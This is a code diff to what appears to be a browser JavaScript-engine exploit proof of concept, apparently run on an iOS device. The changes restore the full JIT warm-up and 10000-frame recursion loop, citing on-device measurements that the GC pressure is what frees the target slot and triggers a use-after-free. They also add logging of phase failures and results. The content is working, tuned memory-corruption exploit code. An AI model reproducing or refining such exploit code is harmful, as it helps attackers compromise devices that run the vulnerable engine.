@@ -8,6 +8,9 @@
       try { m = String(e); } catch (e2) { m = 'unstringifiable'; }
       out.guard.push(name + ': ' + m);
       out.step.push(name + ':FAILED');
+      // report the failure the moment it happens: a phase error is diagnostic
+      // gold and must survive even if the run is killed later
+      aveStep('PHASE ' + name + ' FAILED: ' + m);
       return false;
     }
   }
@@ -56,11 +59,14 @@
   guard('hunt', function () {
     for (let k = 0; k < 10000 && !W; ++k) {
       rounds = k + 1;
-      // OSR cost: full inner loops while foo/rec tier up, then a much cheaper
-      // variant so more rounds fit into the time budget.
-      var kk = (k < 30) ? 10 : 2;
-      foo(false, kk, k % 5 + 1);
-      rec(2000);
+      // The original PoC's per-round dynamics are what actually frees the slot:
+      // foo() with the full inner loop (JIT warmup + the OSR'd function that
+      // mispredicts), and a 10000-frame recursion whose depth is what drives the
+      // GC.  Measured on device: a shaved round costs 28 ms and did NOT fire in
+      // 4875 attempts, whereas the unshaved round costs ~100 ms -- the GC
+      // pressure, not the round count, is the trigger.
+      foo(false, 10, k % 5 + 1);
+      rec(10000);
       for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
       let fr = arr[arr_index].p1.p1;
       let noCow = 13.37;
@@ -133,5 +139,9 @@
   });
 
   aveStep('phases: ' + out.step.join(' | '));
-  return JSON.stringify(out);
+  var answer = JSON.stringify(out);
+  // post the answer from inside the script too, so it is in the log even if
+  // the return trip through Objective-C never completes
+  aveStep('RESULT ' + answer);
+  return answer;
 })()
